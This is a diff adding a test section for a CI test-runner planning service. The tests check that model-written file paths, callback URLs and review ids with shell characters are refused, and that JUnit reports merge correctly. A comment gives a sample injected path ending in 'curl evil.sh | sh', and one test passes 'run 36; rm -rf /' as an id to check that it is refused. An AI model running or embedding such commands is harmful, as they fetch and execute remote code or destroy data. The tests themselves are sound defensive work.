@@ -5348,6 +5348,190 @@ def main():
         finally:
             llm_gateway.call_tool = _prev35
 
+    # ══ 36. And a way to actually run them ═════════════════════════════════
+    #
+    # Phase 3. Phase 2's endpoint was open for anybody to post to and nobody had, because
+    # "run them and post the result" is three unstated decisions -- which command, which
+    # JUnit flag, which URL. This is the platform answering all three from what it already
+    # knows: the framework it wrote every file for.
+    #
+    # Nothing here runs a test either (D-05). What is checked is that the rendered command
+    # is one a machine could run, that everything it cannot do is stated rather than
+    # guessed at, and that nothing a model wrote reaches a shell unchecked.
+    section("36. How to run them: a CI workflow and a local command, both free")
+
+    from backend.services import test_runner_plan as _trp
+
+    _files36 = [
+        {"path": "tests/test_owner.py", "framework": "pytest",
+         "prerequisites": ["running application", "database"]},
+        {"path": "tests/e2e/login.spec.js", "framework": "Playwright",
+         "prerequisites": ["browser"]},
+        {"path": "tests/x y.py", "framework": "pytest", "prerequisites": []},
+        {"path": "tests/z.rb", "framework": "Homegrown 9", "prerequisites": []},
+        "a response row that is a string, not an object",
+    ]
+    _plan36 = _trp.plan_for(_files36)
+    check("a framework the table knows becomes a runnable command",
+          [j["framework"] for j in _plan36["jobs"]] == ["pytest", "playwright"],
+          str([j["framework"] for j in _plan36["jobs"]]))
+    check("...built from a lookup rather than a second model call",
+          _plan36["jobs"][0]["argv"][:3] == ["python", "-m", "pytest"],
+          "a command written by a model would be wrong differently every time, cost money, "
+          "and put model-written shell in a file somebody else's CI executes")
+    check("...and the local argv and the CI shell string say the same thing",
+          _plan36["jobs"][0]["shell"] == " ".join(_plan36["jobs"][0]["argv"]),
+          "a local green and a CI green have to mean the same run")
+    check("a path with a shell character in it is refused, not quoted",
+          _plan36["unsafe_paths"] == ["tests/x y.py"],
+          "these paths are written by a model and end up in a command on a machine we have "
+          "never seen; 'tests/a.py; curl evil.sh | sh' is a path as far as JSON is concerned")
+    check("...and the refusal is reported, because that file is now uncovered",
+          bool(_plan36["unsafe_paths"]), "a silent skip makes a narrow run look complete")
+    check("a framework nobody here knows is named, never guessed at",
+          _plan36["unknown_frameworks"] == ["Homegrown 9"],
+          str(_plan36["unknown_frameworks"]))
+    check("a response row that is not an object is ignored rather than crashing",
+          len(_plan36["jobs"]) == 2, "the live shape from D-392, in a second reader")
+    check("what no CI runner can supply is stated up front",
+          _plan36["must_supply"] == ["database", "running application"],
+          f"{_plan36['must_supply']} -- C-63, named before the job goes red rather than "
+          "discovered from it")
+    check("...but a browser is not on that list, because Playwright installs one",
+          "browser" not in _plan36["must_supply"], str(_plan36["must_supply"]))
+    check("a framework whose JUnit output needs an extra package says so",
+          _trp.plan_for([{"path": "a.test.js", "framework": "Jest"}])["extra_packages"]
+          == ["jest-junit"],
+          "without it the runner works, writes nothing, and the suite reads as never run")
+
+    _wf36 = _trp.render_workflow(
+        "run-36", "https://sdlc.example.com/api/reviews/run-36/test-results", _plan36)
+    check("the workflow reports even when nothing ran",
+          "suite did not run" in _wf36,
+          "a report that stops arriving looks exactly like a suite that stopped failing, "
+          "and every requirement would keep its unchallenged claim of coverage")
+    check("...runs its report step whatever the tests did",
+          "if: always()" in _wf36, "the failing run IS the payload")
+    check("...takes the key from a repository secret and never writes it down",
+          f"secrets.{_trp.API_KEY_SECRET}" in _wf36 and "${{ secrets." in _wf36)
+    check("...and asks for nothing it does not need",
+          "contents: read" in _wf36, "this job reports; it never writes to the repository")
+
+    # The script the workflow embeds is the one piece of this that a customer's runner
+    # executes and no offline test can otherwise see. A syntax error in it would be found
+    # by them, as a job that reports nothing.
+    _emb36 = _wf36.split("python3 - <<'LM_REPORT_PY'", 1)[-1].split("LM_REPORT_PY", 1)[0]
+    _emb36 = "\n".join(l[10:] if l.startswith(" " * 10) else l for l in _emb36.split("\n"))
+    try:
+        compile(_emb36, "<embedded report step>", "exec")
+        check("the report script embedded in the workflow is valid Python", True,
+              "the only part of this that runs on a machine we cannot see")
+    except SyntaxError as _exc36:
+        check("the report script embedded in the workflow is valid Python", False, str(_exc36))
+
+    # Two producers of one contract (D-62) means two copies of the merge: the workflow
+    # cannot import this repo. This is the check that stops them drifting apart.
+    _docs36 = ['<testsuite name="a"><testcase name="t1"/></testsuite>',
+               '<testsuites><testsuite name="b"><testcase name="t2"/></testsuite></testsuites>',
+               "<not xml at all"]
+    _merged36 = _trp.merge_junit(_docs36)
+    check("several runners' reports merge into the one report the endpoint takes",
+          _merged36.count("<testsuite ") == 2 and "t2" in _merged36,
+          "posting them separately would file two runs against one execution, and every "
+          "requirement covered by the other half would read as not_run -- the phase's most "
+          "important verdict, wrong")
+    check("...and an unreadable file does not cost us the readable ones",
+          "t1" in _merged36, _merged36[:120])
+    check("...with nothing to merge reported as nothing, not as an empty pass",
+          _trp.merge_junit(["<nope"]) == "")
+    _ET36 = __import__("xml.etree.ElementTree", fromlist=["ElementTree"])
+    _ci36 = _ET36.Element("testsuites")
+    for _t36 in _docs36[:2]:
+        _r36 = _ET36.fromstring(_t36)
+        for _s36 in ([_r36] if _r36.tag == "testsuite" else list(_r36.iter("testsuite"))):
+            _ci36.append(_s36)
+    check("the workflow's own copy of that merge agrees with this one",
+          _ET36.tostring(_ci36, encoding="unicode").count("<testsuite ")
+          == _merged36.count("<testsuite "),
+          "the workflow carries its own because a GitHub runner cannot import this file; "
+          "that copy is the one that can drift unnoticed")
+
+    for _label36, _bad36 in (("a URL a shell could break out of", "https://x.com/a b"),
+                             ("something that is not a URL at all", "sdlc.example.com")):
+        try:
+            _trp.render_workflow("run-36", _bad36, _plan36)
+            check(f"{_label36} is refused", False, "it was rendered")
+        except ValueError:
+            check(f"{_label36} is refused rather than escaped", True,
+                  "modernization_pr._yaml_scalar's rule, and for the same reason")
+    try:
+        _trp.render_workflow("run 36; rm -rf /", "https://x.com/a", _plan36)
+        check("a review id that is not an identifier is refused", False)
+    except ValueError:
+        check("a review id that is not an identifier is refused", True)
+    try:
+        _trp.render_workflow("run-36", "https://x.com/a",
+                             _trp.plan_for([{"path": "a.rb", "framework": "Homegrown"}]))
+        check("a suite with no runnable framework renders nothing", False)
+    except ValueError:
+        check("a suite with no runnable framework renders nothing rather than a stub",
+              True, "a workflow that runs no tests and reports green is the worst outcome")
+
+    _m34.llm_settings_service.is_llm_configured = lambda: True
+    with _TC35(_m34.app, raise_server_exceptions=False) as _c36:
+        _t36 = _c36.post("/api/auth/login",
+                         json={"username": "admin",
+                               "password": config.DEFAULT_ADMIN_PASSWORD}).json()["token"]
+        _p36 = _c36.post("/api/v1/projects", json={"name": "S36"},
+                         headers={"Authorization": f"Bearer {_t36}"}).json()["project"]["id"]
+        _H36 = {"Authorization": f"Bearer {_t36}", "X-Project-Id": _p36}
+        _prev36 = llm_gateway.call_tool
+        llm_gateway.call_tool = lambda *a, **k: {
+            "levels_chosen": [{"level": "Unit", "rationale": "r"}],
+            "test_files": [{"path": "tests/t.py", "framework": "pytest", "level": "Unit",
+                            "prerequisites": ["database"], "content": "def test_a():\n    pass\n",
+                            "test_names": ["test_a"], "covers": ["c"]}],
+            "requirement_coverage": [{"requirement_ref": "r", "covered": True,
+                                      "test_names": ["test_a"]}],
+            "not_automated": [], "assumptions": [], "summary": "s"}
+        try:
+            _g36 = _c36.post("/api/review/test-automation", headers=_H36, json={
+                "requirement": "A task may only be updated by its owner.",
+                "files": [{"path": "app.py", "content": "def update():\n    return 1\n"}]})
+            _rid36 = _g36.json().get("review_id")
+            _n36 = len(_calls34)
+
+            _r36 = _c36.get(f"/api/reviews/{_rid36}/runner?callback_url="
+                            f"https://sdlc.example.com/api/reviews/{_rid36}/test-results",
+                            headers=_H36)
+            check("a finished generation can be asked how to run itself",
+                  _r36.status_code == 200, f"{_r36.status_code} {_r36.text[:200]}")
+            check("...calling no model, because a lookup is not a generation",
+                  len(_calls34) == _n36, "nothing on this path may be billable")
+            _rj36 = _r36.json()
+            check("...answering with a command a developer can paste",
+                  _rj36["local_command"].startswith("python scripts/run_tests.py --review"),
+                  str(_rj36.get("local_command")))
+            check("...and a workflow that reports to this run, not to a run in general",
+                  _rid36 in (_rj36.get("workflow_yaml") or ""), "the URL carries the id")
+            check("...naming what it cannot supply, on the object a screen renders",
+                  _rj36["must_supply"] == ["database"], str(_rj36.get("must_supply")))
+            check("...and never claiming the platform will run any of it",
+                  _rj36.get("attested") is False)
+
+            _loop36 = _c36.get(f"/api/reviews/{_rid36}/runner"
+                               f"?callback_url=http://localhost:8000/x", headers=_H36).json()
+            check("a callback a CI runner cannot reach is refused with a reason",
+                  _loop36["workflow_yaml"] is None and "not reachable" in _loop36["blocked_reason"],
+                  f"{str(_loop36.get('blocked_reason'))[:90]} -- it would run, fail to post, "
+                  "and look exactly like a suite nobody triggered")
+
+            check("a run that generated no tests has no runner to describe",
+                  _c36.get("/api/reviews/nope/runner", headers=_H36).status_code == 404)
+        finally:
+            llm_gateway.call_tool = _prev36
+
+
 
     print()
     print("-" * 60)
